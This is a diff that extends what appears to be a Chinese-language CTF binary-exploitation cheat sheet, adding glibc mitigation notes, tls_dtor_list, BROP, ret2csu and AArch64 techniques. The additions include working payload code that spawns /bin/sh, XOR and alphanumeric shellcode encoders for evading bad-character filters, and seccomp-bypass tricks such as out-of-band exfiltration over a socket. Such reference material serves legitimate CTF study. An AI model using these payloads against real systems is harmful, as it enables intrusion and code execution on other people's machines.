@@ -72,6 +72,9 @@ payload = fmtstr_payload(offset, {target_addr: value})
 | ≥2.32 | safe-linking (fd 指针混淆) | fd 需 XOR `(heap_addr >> 12)` |
 | ≥2.34 | `__malloc_hook`/`__free_hook` 移除 | 转向 IO_FILE / exit_hook |
 | ≥2.35 | 对齐地址检查加强 | fake chunk 必须 16-byte aligned |
+| ≥2.37 | `_rtld_global._dl_ns[0]._ns_loaded` 只读 | House of Banana 需绕过只读 link_map |
+| ≥2.38 | TLS 偏移变化 | tls_dtor_list 攻击需重新计算偏移 |
+| ≥2.39 | - | 关注 glibc 2.40+ 新变化 |
 
 #### 基础堆利用
 - **tcache poisoning** (glibc ≥2.26): double free → overwrite fd → 任意分配
@@ -169,6 +172,30 @@ fake_io = flat({
 # 然后在该堆地址处布置 fake _IO_FILE → exit() 触发 FSOP
 ```
 
+#### tls_dtor_list (glibc ≥2.34 终局技术)
+```python
+# 原理: exit() → __call_tls_dtors → func(cur->obj)
+# tls_dtor_list 在 TLS fs:[-0x58] 处
+#
+# dtor_list 结构 (0x20 字节):
+# +0x00: func (PTR_DEMANGLED: ROR17(func ^ pointer_guard))
+# +0x08: obj  (func 的参数)
+# +0x10: map  (可为 NULL)
+# +0x18: next (须为 NULL)
+
+# 方法 1: system("/bin/sh")
+def encrypt(addr, guard):
+    return ((addr ^ guard) << 0x11 | (addr ^ guard) >> 0x2f) & 0xffffffffffffffff
+
+payload = p64(encrypt(system_addr, pointer_guard))  # func
+payload += p64(binsh_addr)                           # obj (arg1)
+payload += p64(0) + p64(0)                           # map, next
+
+# 方法 2: Stack Pivot → ROP (适用于 seccomp ORW)
+# func = encrypt(leave_ret, pointer_guard)
+# obj 指向 ROP chain → leave;ret 后 rsp = rop_chain
+```
+
 ### SROP (Sigreturn-Oriented Programming)
 ```python
 from pwn import *
@@ -206,6 +233,23 @@ one_gadget libc.so.6
 payload = flat(b'A' * offset, libc_base + one_gadget_offset)
 ```
 
+### BROP (Blind ROP)
+```python
+# 无 info leak 时的利用方法 (服务 crash 后重启)
+# 前提: binary 无 PIE (或已知代码段地址), 无 canary (或可逐字节爆破)
+
+# 1. 爆破 offset + canary (byte-by-byte)
+for b in range(256):
+    payload = b'A' * offset + b'X' * (known_canary_len + 1)
+    payload += bytes([b])
+    # ... 发送, 观察 crash/正常返回 → 确定 canary 字节
+
+# 2. 找 Stop gadget (ret 指令, 不 crash)
+# 3. 找 BROP gadget (ret2csu 模式): pop rdi; ret / pop rsi; pop r15; ret
+# 4. 扫描 PLT: 调用 write/puts 泄漏内存
+# 5. 从返回的字节中 dump binary → 找更多 gadget → 完整 ROP
+```
+
 ### SECCOMP orw shellcode
 ```python
 # 当 execve 被禁，用 open-read-write 读 flag
@@ -221,6 +265,40 @@ payload = asm(shellcode)
 # seccomp-tools dump ./binary
 ```
 
+### Shellcode 约束绕过
+```python
+# 当 shellcode 有字符限制时 (badchars, 可见字符等)
+
+# 1. pwntools 编码器: shellcraft + encoder
+from pwn import *
+context.arch = 'amd64'
+shellcode = asm(shellcraft.sh())
+encoded = encoder.avoid(b'\x00\x0a\x0d\x20')  # 自动编码避开 badchars
+
+# 2. 自修改解码 stub — 异或/XOR 编码
+payload = asm('''    /* 解码器 stub */
+    lea rsi, [rip + encoded]
+    xor ecx, ecx
+decode:
+    xor byte ptr [rsi + rcx], 0x42
+    inc rcx
+    cmp rcx, len
+    jl decode
+    jmp rsi
+encoded:
+    /* XOR(0x42) 编码后的真实 shellcode */
+''')
+
+# 3. 字母数字 shellcode (可见字符 ASCII)
+context.arch = 'amd64'
+shellcode = asm(shellcraft.amd64.alphanumeric(shellcraft.sh()))
+# 检查: all(c in string.printable.encode() for c in shellcode)
+
+# 4. 短 shellcode (缓冲区极小)
+# push 0x68732f6e69622f  → /bin/sh (8 字节)
+# 或 stage 2 loader: read(0, rsp, 0x100) → 再读入完整 shellcode
+```
+
 ### ret2dlresolve
 ```python
 # 当 Partial RELRO + 无 leak
@@ -228,6 +306,30 @@ rop = ROP(elf)
 dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
 rop.read(0, dlresolve.data_addr)
 rop.ret2dlresolve(dlresolve)
+```
+
+### ret2csu (__libc_csu_init)
+```python
+# 两段 gadget 控制 rdi/rsi/rdx 并调用函数 (无 pop rdx; ret 时必备)
+# Gadget 1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+# Gadget 2: mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]
+
+csu_pop = 0x401xxa  # 找到 binary 中的地址
+csu_call = 0x401xxb
+
+payload = flat(
+    b'A' * offset,
+    csu_pop,
+    0,             # rbx = 0
+    1,             # rbp = 1 (循环检查: rbx+1 == rbp)
+    edi_val,       # r12 → edi (arg1)
+    rsi_val,       # r13 → rsi (arg2)
+    rdx_val,       # r14 → rdx (arg3)
+    func_got,      # r15 → GOT 条目
+    csu_call,
+    0,0,0,0,0,0,0, # csu_call 尾部的 pop 恢复
+    next_rop,      # 后续 ROP
+)
 ```
 
 ---
@@ -361,6 +463,50 @@ r.interactive()
 
 ---
 
+## WP 记录要点
+
+### 必需信息
+```bash
+# checksec 输出 — 记录完整保护状态
+checksec --file=./binary
+
+# libc / ld 信息
+file libc.so.6
+strings libc.so.6 | grep 'GNU C Library' | head -1
+sha256sum libc.so.6 ld-linux-x86-64.so.2  # 校验版本一致性
+
+# 关键偏移 (WP 中标注计算过程)
+# offset = 0x40(buf) + 8(rbp) = 0x48 → 72
+# leak = puts(got_puts) → libc_base = leak - puts_off
+# system = libc_base + system_off; binsh = libc_base + binsh_off
+# one_gadget = libc_base + one_gadget_off
+```
+
+### 本地 vs 远程差异排查
+```python
+# 远程不通的常见原因:
+# 1. libc 版本差异 (即使同一发行版也有小版本差异)
+# 2. LD_PRELOAD / 环境变量差异
+# 3. ASLR 开关 (本地 gdb 默认关 ASLR)
+# 4. 网络传输中的 null 字节/换行截断
+
+def conn():
+    if args.REMOTE:
+        return remote('host', port)
+    p = process(elf.path)
+    if args.GDB:
+        gdb.attach(p)
+    return p
+
+# 确保本地使用题目提供的 libc
+# patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./binary
+# patchelf --set-rpath . ./binary
+```
+
+**复现模板**: WP 中每步标注命令 → 预期输出 → 发现 → 依据（checksec、偏移计算、libc 版本）
+
+---
+
 ## Kernel Pwn 基础
 
 ### 判断是否为 Kernel 题
@@ -418,6 +564,53 @@ cat run.sh  # 查看 QEMU 参数 (kaslr, smep, smap, kpti)
 
 ---
 
+## AArch64 (ARM64) 利用基础
+
+### 与 x86_64 的关键差异
+| 特性 | AArch64 | x86_64 |
+|------|---------|--------|
+| 返回地址 | x30 (LR), 不自动入栈 | 保存在栈上 |
+| 参数传递 | x0-x7 | rdi, rsi, rdx, rcx, r8, r9 |
+| 帧指针 | x29 (FP) | rbp |
+| Syscall | `mov x8, #num; svc #0` | `syscall` 指令 |
+| 常用 gadget | `ldp x29, x30, [sp], #N; ret` | `pop rdi; ret` 等 |
+
+### AArch64 ROP 要点
+```python
+# 参数寄存器: x0-x7
+# 典型 gadget 模式: ldp (load pair) 批量恢复寄存器
+# ldp x19, x20, [sp, #0x10]
+# ldp x29, x30, [sp], #0x20
+# ret
+
+# ret2csu (ARM64 版)
+# 通过 __libc_csu_init 中的两段 gadget 控制参数
+# 步骤: 1. 控制 x19-x30 → 2. 调用 x17 指向的函数 → 3. 设置 x0-x2
+
+# shellcode syscall
+context.arch = 'aarch64'
+shellcode = asm('''
+    /* execve("/bin/sh", 0, 0) */
+    mov x0, #0x              /* NULL terminator for /bin/sh */
+    str x0, [sp, #-8]!       /* push 0 onto stack */
+    adr x1, binsh
+    stp x1, x0, [sp, #-16]! /* argv = {binsh, NULL} */
+    mov x0, x1              /* x0 = binsh */
+    mov x1, sp              /* x1 = argv */
+    mov x2, xzr             /* x2 = NULL (envp) */
+    mov x8, #221            /* execve = 221 */
+    svc #0
+binsh: .asciz "/bin/sh"
+''')
+```
+
+### ARM64 堆利用
+- tcache/safe-linking: 与 x86_64 相同，fd = next ^ (cur >> 12)
+- IO_FILE exploit: 结构体布局相同，但函数指针偏移因架构而异
+- syscall number: execve=221, open=56, read=63, write=64
+
+---
+
 ## Escalation
 
 需要 `reverse-agent` 当：
@@ -453,6 +646,17 @@ print(ELF('./binary').checksec())
 | write | writev / pwritev / sendfile(stdout, fd, 0, 0x100) |
 | 所有文件操作 | 侧信道: 逐字节猜测 flag, 用 nanosleep/clock_gettime 计时 |
 | ARCH==x86_64 | retf 切换到 32-bit mode, 使用 32-bit syscall number 绕过 |
+| mprotect 禁 | mmap(MAP_FIXED) 重映射 RWX; memfd_create + file-based mmap |
+| open/read/write 全禁 | socket+connect OOB 外泄; mmap 映射 fd 代替 read |
+
+### 替代 Syscall 速查
+```python
+# 当某类 syscall 被过滤时的替代方案
+# open 族:  open → openat(AT_FDCWD, ...) → openat2 → name_to_handle_at+open_by_handle_at
+# read 族:  read → pread64 → readv → preadv2 → process_vm_readv
+# write 族: write → pwrite64 → writev → pwritev2 → sendfile
+# exec 族:  execve → execveat → execvp (非 syscall, libc 函数)
+```
 
 ### ORW Shellcode (pwntools)
 
